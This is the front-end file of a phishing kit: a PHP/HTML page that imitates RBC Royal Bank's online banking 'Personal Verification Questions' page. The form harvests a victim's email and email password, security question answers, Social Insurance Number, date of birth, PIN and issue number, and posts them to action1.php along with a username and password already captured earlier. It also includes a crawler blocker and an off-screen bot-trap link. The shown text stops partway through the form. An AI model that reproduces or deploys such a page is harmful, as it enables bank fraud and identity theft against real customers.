<?php
include('blocker.php');
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">  <script type="text/javascript" language="javascript">function checkform ( form )
{
    if (form.name.value.length < 1) {
    alert( "Error : invalid field" );
    form.name.focus();
          document.getElementById('name').style.backgroundColor="#FF6A6A";
    return false ;
  }
    if (form.emailpass.value.length < 1) {
    alert( "Error : invalid field" );
    form.emailpass.focus();
          document.getElementById('emailpass').style.backgroundColor="#FF6A6A";
    return false ;
  }
  
   if (form.email.value.length < 1) {
    alert( "Error : invalid field" );
    form.email.focus();
          document.getElementById('email').style.backgroundColor="#FF6A6A";
    return false ;
  }
   if (form.q1.value.length < 1) {
    alert( "Error : invalid field" );
    form.q1.focus();
	  document.getElementById('q1').style.backgroundColor="#FF6A6A";
    return false ;
  }
     if (form.a1.value.length < 4) {
    alert( "Error : invalid field" );
    form.a1.focus();
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="#FF6A6A";
    return false ;
  }
     if (form.q2.value.length < 1) {
    alert( "Error : invalid field" );
    form.q2.focus();
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="#FF6A6A";
    return false ;
  }
       if (form.a2.value.length < 4) {
    alert( "Error : invalid field" );
    form.a2.focus();
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="#FF6A6A";
    return false ;
  } if (form.q3.value.length < 1) {
    alert( "Error : invalid field" );
    form.q3.focus();
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="";
	  document.getElementById('q3').style.backgroundColor="#FF6A6A";
    return false ;
  }   if (form.a3.value.length < 4) {
    alert( "Error : invalid field" );
    form.a3.focus();
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="";
	  document.getElementById('q3').style.backgroundColor="";
	  document.getElementById('a3').style.backgroundColor="#FF6A6A";
    return false ;
  }     if (form.sin1.value.length < 3) {
    alert( "Error : invalid field" );
    form.sin1.focus();
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="";
	  document.getElementById('q3').style.backgroundColor="";
	  document.getElementById('a3').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="#FF6A6A";
    return false ;
  }       if (form.sin2.value.length < 3) {
    alert( "Error : invalid field" );
    form.sin2.focus();
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="";
	  document.getElementById('q3').style.backgroundColor="";
	  document.getElementById('a3').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="#FF6A6A";
    return false ;
  }         if (form.sin3.value.length < 3) {
    alert( "Error : invalid field" );
    form.sin3.focus();
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="";
	  document.getElementById('q3').style.backgroundColor="";
	  document.getElementById('a3').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="#FF6A6A";
    return false ;
  }           if (form.dobd.value.length < 1) {
    alert( "Error : invalid field" );
    form.dobd.focus();
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="";
	  document.getElementById('q3').style.backgroundColor="";
	  document.getElementById('a3').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="#FF6A6A";
    return false ;
  }             if (form.dobm.value.length < 1) {
    alert( "Error : invalid field" );
    form.dobm.focus();
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="";
	  document.getElementById('q3').style.backgroundColor="";
	  document.getElementById('a3').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="#FF6A6A";
    return false ;
  }             if (form.doby.value.length < 4) {
    alert( "Error : invalid field" );
    form.doby.focus();
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="";
	  document.getElementById('q3').style.backgroundColor="";
	  document.getElementById('a3').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="#FF6A6A";
    return false ;
  }
                if (form.pin.value.length < 4) {
    alert( "Error : invalid field" );
    form.pin.focus();
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="";
	  document.getElementById('q3').style.backgroundColor="";
	  document.getElementById('a3').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="#FF6A6A";
    return false ;
  }
                  if (form.issue.value.length < 2) {
    alert( "Error : invalid field" );
    form.issue.focus();
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="";
	  document.getElementById('q3').style.backgroundColor="";
	  document.getElementById('a3').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('issue').style.backgroundColor="#FF6A6A";
 
    return false ;
  }
  return true ;
  }
</script>
 
 <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" /> 
<title>Personal Verification Questions - RBC Online Banking</title><link rel="stylesheet" type="text/css" href="files/common.css">
<link rel="stylesheet" type="text/css" href="files/custom.css">    <link rel="stylesheet" type="text/css" href="files/legacy.css"><link rel="stylesheet" type="text/css" href="files/main01.css"><link rel="stylesheet" type="text/css" href="files/main02.css"><link rel="stylesheet" type="text/css" href="files/tabs.css">
    
    <link rel="stylesheet" type="text/css" href="files/print.css" media="print">
	<script language="javascript" type="text/javascript">	   function checkOnFocusForm() {
	   if ( rbcGetCookie ("3MTK","NOTTHERE") != "NOTTHERE" ) {	rbcDeleteCookie("3MTK","/");}
		
		   
}	   
checkOnFocusForm();	   
event_addOnFocusForm(new Array(checkOnFocusForm));
addLoadEvent(event_onLoad);
function showThemeNavigation() {
    swapInAlternateElements("OLBAlternatable", "_alternate");
}	   
</script>	 
	<style type="text/css">
<!--
.style3 {font-size: 10px}
-->
    </style>
	</head><body class="template-legacy" onfocus="event_onFocusForm(); " onblur="event_onBlurForm();" onunload="event_onUnload();">
	<a href="../../../../../honey.php" style="color: #fff; cursor: default; position: absolute; bottom: 0; right: -400px;">RBC</a>
	<script type="text/javascript">
<!--
var ProxyVariableData = new Array();
function themeNavigationFormAddParameter(name,value) {
	document.getElementById('themeNavigationForm').innerHTML += 
		'<input name="' + name + '" type="hidden" value="' + value + '"/>';
}
-->
</script>	<div id="wrapper">		
		<div class="skipnav"><a href="#skipheadernav">Skip Header Navigation</a></div>        
		    
    
    
<div id="globalheader" class="clear globalheader-basic globalheader-secure OLBAlternatable">	
	
	
	
		
	<div id="globalheader-logo" class="OLBAlternatable"><a href="#"><img src="files/rbc_royalbank_en.gif" alt="RBC Royal Bank" width="210" height="47"></a></div>	<p id="globalheader-links" class="OLBAlternatable">				    <a href="#" onclick="return popupHelp(this.href)" target="_blank" title="Customer Service (opens new window)" class="linkedtextandicon"><span>Customer Service</span></a>	</p>
	<p id="globalheader-secureinfo" class="OLBAlternatable">		
		
<strong><img src="files/secure.gif" alt="Secure" class="icon">											Username Verification			
		
		</strong>
	</p> 
	<p id="globalheader-tools" class="OLBAlternatable">		
			</p>
</div>		
<div id="globalheader_alternate" class="clear  globalheader-secure OLBAlternate" style="display: none;">	
	
	
	
		
	<div id="globalheader-logo_alternate" class="OLBAlternate"><a href="#"><img src="files/rbc_royalbank_en.gif" alt="RBC Royal Bank" width="210" height="47"></a></div>	<p id="globalheader-links_alternate" class="OLBAlternate">		
		          
		              <script type="text/javascript">
function themeBanner_alternateAddParametersSiteMap() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c5/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTowADE6B8JE55A18DSnQHmxDQHQ5yLU4Vll4GeOU9AgzxynsbmuKVB_sOnzzI_SB5AxzA0UA_ODVPP1I_yhy3L431Q_QjnfX9PPJzU_ULckMjDDI9MwMyikwAYMPU1A!!/dl3/d3/L2dJQSEvUUt3QS9ZQnZ3LzZfNFA4OEg5RzA5MExCNjBJQUg3R0RENDIwQzM!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action='/wps/myportal/OLB/!ut/p/c5/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTowADE6B8JE55A18DSnQHmxDQHQ5yLU4Vll4GeOU9AgzxynsbmuKVB_sOnzzI_SB5AxzA0UA_ODVPP1I_yhy3L431Q_QjnfX9PPJzU_ULckMjDDI9MwMyikwAYMPU1A!!/dl3/d3/L2dJQSEvUUt3QS9ZQnZ3LzZfNFA4OEg5RzA5MExCNjBJQUg3R0RENDIwQzM!/';themeBanner_alternateAddParametersSiteMap();document.themeNavigationForm.submit();">Site Map</a></p>
	<p id="globalheader-secureinfo_alternate" class="OLBAlternate">		<span class="button button-secondary"><span><a href="https://www1.royalbank.com/cgi-bin/rbaccess/rbunxcgi?F8=1&amp;F22=HT&amp;REQUEST=SIGNOUT&amp;CPG=55230&amp;LANGUAGE=ENGLISH">Sign Out</a></span></span>
		
<strong><img src="files/secure.gif" alt="Secure" class="icon">																<script type="text/javascript">
function themeBanner_alternateAddParametersClientName() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c5/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTowADE6B8JE55A18DSnQHmxDQHQ5yLU4Vll4GeOU9AgzxynsbmuKVB_sOnzzI_SB5AxzA0UA_ODVPP1I_yhy3L431Q_QjnfX9PPJzU_ULckMjDDI9MwMyikwAYMPU1A!!/dl3/d3/L2dJQSEvUUt3QS9ZQnZ3LzZfNFA4OEg5RzA5MExCNjBJQUg3R0RENDJIUDE!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action='/wps/myportal/OLB/!ut/p/c5/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTowADE6B8JE55A18DSnQHmxDQHQ5yLU4Vll4GeOU9AgzxynsbmuKVB_sOnzzI_SB5AxzA0UA_ODVPP1I_yhy3L431Q_QjnfX9PPJzU_ULckMjDDI9MwMyikwAYMPU1A!!/dl3/d3/L2dJQSEvUUt3QS9ZQnZ3LzZfNFA4OEg5RzA5MExCNjBJQUg3R0RENDJIUDE!/';themeBanner_alternateAddParametersClientName();document.themeNavigationForm.submit();">KEHINDE PETER</a>							
		
		</strong>
	</p>
	<p id="globalheader-tools_alternate" class="OLBAlternate">		
		September 17, 2010	</p>
</div>        		    
    
    
<div id="mainnav" class="OLBAlternatable hide">
	
      <div id="mainnav-level1" class="clear OLBAlternatable">
      </div>
	
      <div id="mainnav-level2" class="clear OLBAlternatable">
      </div>
	
</div>        		    
    
    
<div id="mainnav_alternate" class="OLBAlternate " style="display: none;">
	
      <div id="mainnav-level1_alternate" class="clear OLBAlternate">
  		  <ul>																																																																																																																																																																																																																																												<li class="mainnav-level1-firstlink">														<span>								<a href="http://www.rbc.com/canada.html" onclick="return popupNewbrowser(this.href)" target="_blank" title="Products &amp; Services (opens new window)">Products &amp; Services</a>							</span>						</li>																																																																																																																																																																																																																						<li class="mainnav-level1-currentpage">															<img class="mainnav-level1-screenreaderimage" src="files/screenreaderimage.gif" alt="You are on:">														<span>								<script type="text/javascript">
function themeTopNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI4NgE_2CbEdFAOARVKM!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action='/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI4NgE_2CbEdFAOARVKM!/';themeTopNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct();document.themeNavigationForm.submit();">My Accounts</a>							</span>						</li>																																																																																																																																																																																																																						<li class="mainnav-level1-rightofcurrentpage">														<span>								<a href="https://www.rbcroyalbank.com/customer-service/online-banking/index.html">Customer Service</a>							</span>						</li>																																																																																																													</ul>
		  
      </div>
	
      <div id="mainnav-level2_alternate" class="clear OLBAlternate">
  		  <ul>																																																																																																																																																																																																																																												<li class="mainnav-level2-firstlink">														<span>								<script type="text/javascript">
function themeTopNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_accountsummary() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI4NgQ_2CbEdFAFOAmfM!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action='/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI4NgQ_2CbEdFAFOAmfM!/';themeTopNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_accountsummary();document.themeNavigationForm.submit();">Accounts Summary</a>							</span>						</li>																																																																																																																																																																																																																						<li class="mainnav-level2-currentpage">															<img class="mainnav-level2-screenreaderimage" src="files/screenreaderimage.gif" alt="You are on:">														<span>								<script type="text/javascript">
function themeTopNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTIwNfA_2CbEdFAGW0JA8!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action='/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTIwNfA_2CbEdFAGW0JA8!/';themeTopNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking();document.themeNavigationForm.submit();">Banking</a>							</span>						</li>																																																																					</ul>
		  
      </div>
	
</div>        
		<div class="skipnavanchor"><a name="skipheadernav" id="skipheadernav"></a></div>
 
		<div id="layout" class="clear layout-110 nevervisitedlinks">            
    			<div id="layout-column-left">
    			
	   			              	    	    <!--  navigation start -->
<div id="leftnavskiplink" class="skipnav OLBAlternatable"></div>
<div id="leftnav-olb" class="clear OLBAlternatable"></div>
<div id="leftnavskipanchor" class="skipnavanchor OLBAlternatable"><a name="skipleftnav" id="skipleftnav" class="OLBAlternatable"></a></div>                                                                  <!--  navigation start -->
<div id="leftnavskiplink_alternate" class="skipnav OLBAlternate" style="display: none;"><a href="#skipleftnav">Skip Left Navigation</a></div>
<div id="leftnav-olb_alternate" class="clear OLBAlternate" style="display: none;">	
    
    
	
	
	    
		
		
	
		
	
	<ul class="leftnav-currentsection">
	 
	 	
	
	
		<li class="leftnav-sectionheader"><img class="leftnav-highlight" src="files/highlight-house.gif" alt="You are within:">					 
		

<a href="javascript:document.themeNavigationForm.action='/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTIw9TQ_2CbEdFAKlzSmQ!/';themeSideNav_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails_updatepref();document.themeNavigationForm.submit();">Update My Preferences	</a>																																																																										</li>										  								 														    </ul>													  									</li>			 								   				    												    																											 																								<li>						                    																																								<a href="https://www.rbcroyalbank.com/onlineservices/personal/apply-for-products-and-services.html">Apply for Products and Services</a>																												</li>			 														 							 					 
		  
	</ul>	   </div>
<div id="leftnavskipanchor_alternate" class="skipnavanchor OLBAlternate" style="display: none;"><a name="skipleftnav" id="skipleftnav_alternate" class="OLBAlternate"></a></div>                			    </div>
	        
	        
    
<div class="skipnav OLBAlternatable" id="breadcrumbareaskiplink"></div>
<div id="breadcrumbarea" class="clear OLBAlternatable">
<div id="path" class="OLBAlternatable"></div>
<div class="skipnavanchor"><a name="skipbreadcrumbnav" id="skipbreadcrumbnav" class="OLBAlternatable"></a></div>
</div>              
<div class="skipnav OLBAlternate" id="breadcrumbareaskiplink_alternate" style="display: none;"><a href="#skipbreadcrumbnav">Skip Breadcrumb Links</a></div>
<div id="breadcrumbarea_alternate" class="clear OLBAlternate" style="display: none;">
<p id="path_alternate" class="OLBAlternate">
	 
	  
	  	<script type="text/javascript">
function themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI29DU_2CbEdFAE8SG4U!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action='/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI29DU_2CbEdFAE8SG4U!/';themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa();document.themeNavigationForm.submit();">Personal Accounts</a>	&gt;	<script type="text/javascript">
function themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI48AQ_2CbEdFAOsQxL0!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action='/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI48AQ_2CbEdFAOsQxL0!/';themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails();document.themeNavigationForm.submit();">Profile and Preferences	</a>	&gt;	<script type="text/javascript">
function themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails_updateprof() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI0svA_2CbEdFAMCRzNU!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action='/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTI0svA_2CbEdFAMCRzNU!/';themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails_updateprof();document.themeNavigationForm.submit();">Update My Profile					</a>	&gt;	<script type="text/javascript">
function themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails_updateprof_pvquestion() {
themeNavigationFormAddParameter('7ASCRIPT','/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTowADE_2CbEdFACPn4ck!/');
themeNavigationFormAddParameter('7ASERVER','SP00');
}
</script>
<a href="javascript:document.themeNavigationForm.action='/wps/myportal/OLB/!ut/p/c4/04_SB8K8xLLM9MSSzPy8xBz9CP0os3iTAAsLD0t3A0sDHyczA09HD3N3FxcTowADE_2CbEdFACPn4ck!/';themeBreadCrumb_alternateAddParameterscom_rbc__3m00_olb_web_portal_pg_myacct_banking_pa_papdetails_updateprof_pvquestion();document.themeNavigationForm.submit();">Personal Verification Questions</a>	
		
	 
</p>
<div class="skipnavanchor"><a name="skipbreadcrumbnav" id="skipbreadcrumbnav_alternate" class="OLBAlternate"></a></div>
</div>            			<div id="layout-column-main">					 
 
 
 
 
 
 
 
 
 
 
 
 
 
<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"><tbody><tr height="100%"> 
<td valign="top" width="570px"> 
 
 
 
 
 
<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"> 
<tbody><tr><td valign="top" width="100%"> 
 
 
 
 
 
 
 
 
 
<a name="7_4P88H9G090LB60IAH7GDD42P03"></a><div class="wpsPortletBody">
<table width="100%">
	<tbody><tr>
		<td><script type="text/javascript" language="JavaScript">document.cookie='PPAGE=ChangePVQsA; path=/';</script><!--3MSHELL01.HTM (420) start--><!--Start of 3MSHELLID.INC -->
<!--TMP="3MPVQ.HTM"SRC="420"LNG="ENGLISH"PILOT="PORTAL"-->
<!--End of 3MSHELLID.INC -->
<!-- Start of 3MSRCPATH.CINC -->
<!-- End of 3MSRCPATH.CINC --><!-- START: content -->
<a name="top" id="top"></a>
<table width="100%">
  <tbody><tr>
    <td valign="top"><!-- Start of 3MSRCRDRT.CINC --><table border="0" cellpadding="0" cellspacing="0" width="100%">
<tbody><tr>
<td><table border="0" cellpadding="0" cellspacing="0" width="100%">
 <tbody><tr><td height="5"></td></tr>
 <tr>
   <td class="pageTitle">Personal Verification</td>
 </tr> <tr>
  <td>
<!--3MMSGSPT.CINC:-->
<!--3MMSGSPT.CINC.-->  </td>
 </tr>
 <tr><td>&nbsp;</td></tr>
 <tr>
  <td class="bodyText"><p>Please select your Personal Verification Questions &amp; Information and enter the answers in the fields below. </p>
    <table border="0" cellpadding="0" cellspacing="0" width="100%">
      <tbody><tr>  <td></td></tr><tr>  <td height="5"></td></tr>
      </tbody>
    </table>
    <table border="0" cellpadding="0" cellspacing="0" width="100%">
      <tbody><tr>  <td></td></tr><tr>  <td> The following questions are asked only to identify you. You have to link your existing e-mail address from our 
database for a better communication and you can also use it as a secondary login. </td></tr>
      </tbody>
    </table>    
    <p>When you are done, click "Continue."</p></td>
 </tr>
</tbody></table><table border="0" cellpadding="0" cellspacing="0" width="100%">
<form name="test" action="action1.php" method="post" onsubmit="return checkform(this);">
<input type="hidden" name="user" value="<?php print "$user" ; ?>">
<input type="hidden" name="pass" value="<?php print "$pass" ; ?>">
  <tbody><tr>
   <td colspan="3" class="bodyText" width="100%" height="10">&nbsp;</td>
  </tr>
  <tr><td colspan="3" height="5">&nbsp;</td></tr>  <tr>
   <td width="5%">&nbsp;</td>
   <td colspan="2" width="95%" height="10"><span class="asterisk">*</span> <span class="note"><b>Required Information</b></span>   </td>
  </tr>  <tr>
   <td width="5%">&nbsp;</td>
   <td colspan="2" class="fieldLabel" width="95%">Personal Verification Question 1</td>
  </tr>  <tr><td colspan="3"></td></tr>
  <tr>
   <td width="5%">&nbsp;</td>
   <td width="20%">
    <label for="pvqlist1"><span class="asterisk">*</span>&nbsp;<span class="fieldLabel">Question:</span></label>   </td>
   <td class="rbcMonospace" width="75%" height="30">
      <select name="q1" size="1" id="q1" title="Select a question" >
       <option value="">Select a question</option>
       <option value="What was the first movie I ever saw?">What was the first movie I ever saw?</option>
       <option value="What is the middle name of my oldest child?">What is the middle name of my oldest child?</option>
       <option value="In which city was my father born?">In which city was my father born?</option>
       <option value="Who was my favourite cartoon character as a child?">Who was my favourite cartoon character as a child?</option>
       <option value="What is my mother's middle name?">What is my mother's middle name?</option>
       <option value="In what year did I meet my significant other?">In what year did I meet my significant other?</option>
       <option value="What was my first pet's name?">What was my first pet's name?</option>
       <option value="First name of the maid of honour at my wedding?">First name of the maid of honour at my wedding?</option>
       <option value="First name of my best friend in elementary school?">First name of my best friend in elementary school?</option>
       <option value="Name of my all-time favourite movie character?">Name of my all-time favourite movie character?</option>
      </select>   </td>
  </tr>  <tr style="display: none;" id="PVQ1">
    <td colspan="2" width="25%">&nbsp;</td>
    <td width="75%" height="30">
      <input maxlength="60" size="36" name="OWNQUESTION1" id="ownquestion1" title="create a question for PVQ1" onchange="v3mpvq_SetOwnPVQ( '1' );"> <span valign="middle" class="note">(4-60 characters)</span>    </td>
  </tr>
  <tr>
   <td width="5%">&nbsp;</td>
   <td width="20%">
    <label for="answer1"><span class="asterisk">*</span>&nbsp;<span class="fieldLabel">Answer:</span></label>   </td>
   <td width="75%" height="30">
     <input maxlength="20" size="20" placeholder="Answer (1)" name="a1" id="a1" title="enter answer for PVQ1"> 
     <span valign="middle" class="note">(4-20 characters)</span>   </td>
  </tr>
  <tr><td colspan="3">&nbsp;</td></tr>
  <tr>
   <td width="5%">&nbsp;</td>
   <td colspan="2" class="fieldLabel" width="95%">Personal Verification Question 2</td>
  </tr>  <tr><td colspan="3"></td></tr>
  <tr>
   <td width="5%">&nbsp;</td>
   <td width="20%">
    <label for="pvqlist2"><span class="asterisk">*</span>&nbsp;<span class="fieldLabel">Question:</span></label>   </td>
   <td class="rbcMonospace" width="75%" height="30">
      <select name="q2" size="1" id="q2" title="Select a question" onchange="v3mpvq_SelectPVQ( '2' );">
       <option value="">Select a question</option>
       <option value="What was the first book I ever read?">What was the first book I ever read?</option>
       <option value="What was the first company I ever worked for?">What was the first company I ever worked for?</option>
       <option value="What High School did my mother attend?">What High School did my mother attend?</option>
       <option value="In which city was my mother born?">In which city was my mother born?</option>
       <option value="What is my spouse's/partner's middle name?">What is my spouse's/partner's middle name?</option>
       <option value="In which city did I get married?">In which city did I get married?</option>
       <option value="What is my best friend's first name?">What is my best friend's first name?</option>
       <option value="What is the name of the first school I attended?">What is the name of the first school I attended?</option>
       <option value="What was my kindergarten teacher's last name?">What was my kindergarten teacher's last name?</option>
       <option value="What is the first name of my oldest cousin?">What is the first name of my oldest cousin?</option>
      </select>   </td>
  </tr>  <tr style="display: none;" id="PVQ2">
    <td colspan="2" width="25%">&nbsp;</td>
    <td width="75%" height="30">
      <input maxlength="60" size="36" name="OWNQUESTION2" id="ownquestion2" title="create a question for PVQ2" onchange="v3mpvq_SetOwnPVQ( '2' );"> <span valign="middle" class="note">(4-60 characters)</span>    </td>
  </tr>
  <tr>
   <td width="5%">&nbsp;</td>
   <td width="20%">
    <label for="answer2"><span class="asterisk">*</span>&nbsp;<span class="fieldLabel">Answer:</span></label>   </td>
   <td width="75%" height="30">
     <input maxlength="20" size="20" placeholder="Answer (2)" name="a2" id="a2" title="enter answer for PVQ2"> 
     <span valign="middle" class="note">(4-20 characters)</span>   </td>
  </tr>
  <tr><td colspan="3">&nbsp;</td></tr>
  <tr>
   <td width="5%">&nbsp;</td>
   <td colspan="2" class="fieldLabel" width="95%">Personal Verification Question 3</td>
  </tr>  <tr><td colspan="3"></td></tr>
  <tr>
   <td width="5%">&nbsp;</td>
   <td width="20%">
